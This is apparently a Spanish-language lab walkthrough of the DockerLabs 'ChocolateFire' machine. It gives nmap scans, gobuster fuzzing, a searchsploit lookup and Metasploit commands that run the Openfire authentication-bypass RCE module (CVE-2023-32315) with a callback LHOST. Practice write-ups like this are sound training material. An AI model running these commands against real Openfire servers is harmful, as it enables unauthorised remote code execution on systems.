---
tags:
  - Cybersecurity
  - Labs
  - DockerLabs
  - Medium
  - HTTP
  - FuzzingWeb
  - Searchsploit
  - MSF
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Searchsploit|Searchsploit]]
	- [[#Explotación#MSFconsole|MSFconsole]]

---
# Resolviendo la máquina ChocolateFire

>En esta publicación, comparto cómo resolví la máquina **ChocolateFire** de [DockerLabs](https://dockerlabs.es/).

---
## Enumeración
### Ping

Ejecutamos un *ping* para comprobar la conectividad y obtener pistas sobre el sistema operativo.

`ping -c 1 172.17.0.2`

![[Pasted image 20250727085748.png]]

*TTL=64* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts`

![[Pasted image 20250727085841.png]]

`nmap -p22,5222,5223,5262,5263,5269,5270,5275,5276,7070,7777,9090 -sCV 172.17.0.2 -oN targeted`

![[Pasted image 20250727090014.png]]
![[Pasted image 20250727090100.png]]
![[Pasted image 20250727090120.png]]
### HTTP

El servicio **HTTP** se encuentra disponible en el puerto 9090.

`http://172.17.0.2:9090`

![[Pasted image 20250727091652.png]]
#### Fuzzing Web

`gobuster dir -u http://172.17.0.2:9090 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64`

![[Pasted image 20250727091731.png]]

---
## Explotación
### Searchsploit

Se utiliza `searchsploit` para identificar vulnerabilidades asociadas a *Openfire*.

`searchsploit Openfire`

![[Pasted image 20250727092007.png]]
### MSFconsole

En Metasploit (`msfconsole`) se busca un módulo compatible con la *Openfire*. Se encuentra el exploit (`exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315`) que permite una **bypass de autenticación** y ejecución remota de código (**RCE**).

Este exploit aprovecha una vulnerabilidad en *Openfire* (**CVE-2023-32315**), permitiendo ejecutar comandos remotos sin autenticación previa.

```
search Openfire
use 4 | use exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315
show options
set RHOSTS 172.17.0.2
set LHOST 192.168.1.127
exploit
```

![[Pasted image 20250727092534.png]]

---